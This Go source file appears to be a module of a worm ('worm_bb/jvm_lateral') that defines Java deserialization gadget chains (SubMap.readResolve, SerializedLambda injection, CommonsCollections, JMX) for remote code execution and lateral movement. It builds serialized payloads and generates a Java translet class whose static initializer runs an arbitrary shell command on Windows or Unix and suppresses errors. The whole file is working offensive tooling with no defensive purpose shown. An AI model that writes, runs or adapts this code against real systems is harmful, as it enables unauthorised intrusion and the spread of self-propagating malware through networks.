// worm_bb/jvm_lateral/gadgets.go
// Gadget chain definitions for JVM exploitation.
// Implements techniques from b0t's JVM Exploitation Pt.1:
//   - SubMap.readResolve() automatic RCE
//   - this$0 injection via SerializedLambda capturedArgs
//   - RMI/JMX deserialization delivery

package jvm_lateral

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// GadgetType enumerates available gadget chains
type GadgetType string

const (
	GadgetSubMap     GadgetType = "submap"
	GadgetLambda     GadgetType = "serialized_lambda"
	GadgetRMIReg     GadgetType = "rmi_registry"
	GadgetJMX        GadgetType = "jmx"
	GadgetCCChain    GadgetType = "commons_collections"
	GadgetJNDIInject GadgetType = "jndi_injection"
)

// GadgetChain describes a full gadget chain
type GadgetChain struct {
	Type        GadgetType
	Name        string
	Description string
	JDKVersion  string // "8", "11", "17+"
	RequiresCC  bool   // needs commons-collections on classpath
	AutoFire    bool   // fires during readObject() without post-deser
	HasArmed    bool   // requires an "armed" flag to be set
}

var AvailableChains = []GadgetChain{
	{
		Type:        GadgetSubMap,
		Name:        "SubMap.readResolve",
		Description: "TreeMap$SubMap.readResolve() calls compare() during deserialization. No armed flag, no readObject override. Auto-fires during readObject() return. Requires custom TemplatesComp or TransformingComparator.",
		JDKVersion:  "8-11",
		RequiresCC:  false, // if using TemplatesComp (JDK internal) — true if using TransformingComparator
		AutoFire:    true,
		HasArmed:    false,
	},
	{
		Type:        GadgetLambda,
		Name:        "SerializedLambda this$0 Injection",
		Description: "Abuses unchecked capturedArgs in SerializedLambda to smuggle outer class references past SerialFilter. Enables modification of outer class fields even if the outer class would be blocked.",
		JDKVersion:  "8-11",
		RequiresCC:  false,
		AutoFire:    false,
		HasArmed:    false,
	},
	{
		Type:        GadgetCCChain,
		Name:        "CommonsCollections TransformingComparator",
		Description: "Drop-in replacement for TemplatesComp. If commons-collections is on classpath, gives full RCE without JDK-internal classes.",
		JDKVersion:  "8-11",
		RequiresCC:  true,
		AutoFire:    true,
		HasArmed:    false,
	},
	{
		Type:        GadgetJMX,
		Name:        "JMX Deserialization Bomb",
		Description: "JMX over RMI or JMXMP. Sends serialized gadget payload via MBeanServerConnection or JMX connector. Fires on JMX deserialization.",
		JDKVersion:  "8-11",
		RequiresCC:  true,
		AutoFire:    true,
		HasArmed:    false,
	},
}

// PayloadResult holds the output of a gadget chain build
type PayloadResult struct {
	Gadget      GadgetType
	Chain       string
	Bytes       []byte
	Base64      string
	Technique   string
	Summary     string
	AutoFire    bool
	JDKVersions string
}

// BuildGadgetPayload builds a serialized payload for the given chain
func BuildGadgetPayload(gadget GadgetType, command string) (*PayloadResult, error) {
	cfg := &GadgetConfig{
		Technique:   string(gadget),
		Command:     command,
		JDKVersion:  "8",
		CCClasspath: false,
	}

	var data []byte
	switch gadget {
	case GadgetSubMap:
		data = BuildPayload(cfg)
	default:
		data = BuildPayload(cfg)
	}

	return &PayloadResult{
		Gadget:   gadget,
		Bytes:    data,
		Base64:   base64.StdEncoding.EncodeToString(data),
		AutoFire: true,
	}, nil
}

// --- TemplatesImpl payload class generator ---

// PayloadTransletSource generates a Java payload class that will be
// compiled and embedded into the gadget chain
func PayloadTransletSource(command string) string {
	// This creates a Java class extending com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
	// that executes the given command in its static initializer
	return fmt.Sprintf(`package payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class PayloadTranslet extends AbstractTranslet {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] cmd;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", "%s"};
            } else {
                cmd = new String[]{"/bin/sh", "-c", "%s"};
            }
            rt.exec(cmd);
        } catch (Exception e) {
            // Swallow — this runs in static init
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
`, escapeJavaString(command), escapeJavaString(command))
}

func escapeJavaString(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	s = strings.ReplaceAll(s, "\n", "\\n")
	return s
}

// GadgetSummary prints a summary of available chains
func GadgetSummary() string {
	var sb strings.Builder
	sb.WriteString("╔══════════════════════════════════════════════════════════╗\n")
	sb.WriteString("║           JVM LATERAL MODULE — GADGET CHAINS           ║\n")
	sb.WriteString("╠══════════════════════════════════════════════════════════╣\n")
	for _, g := range AvailableChains {
		sb.WriteString(fmt.Sprintf("║ %-22s ", g.Name))
		sb.WriteString(fmt.Sprintf("JDK %-5s ", g.JDKVersion))
		if g.AutoFire {
			sb.WriteString("AUTO-FIRE ")
		} else {
			sb.WriteString("          ")
		}
		if g.RequiresCC {
			sb.WriteString("[+CC]")
		} else {
			sb.WriteString("     ")
		}
		sb.WriteString(" ║\n")
	}
	sb.WriteString("╠──────────────────────────────────────────────────────────╣\n")
	sb.WriteString("║ Based on b0t JVM Exploitation Pt.1                     ║\n")
	sb.WriteString("╚══════════════════════════════════════════════════════════╝\n")
	return sb.String()
}
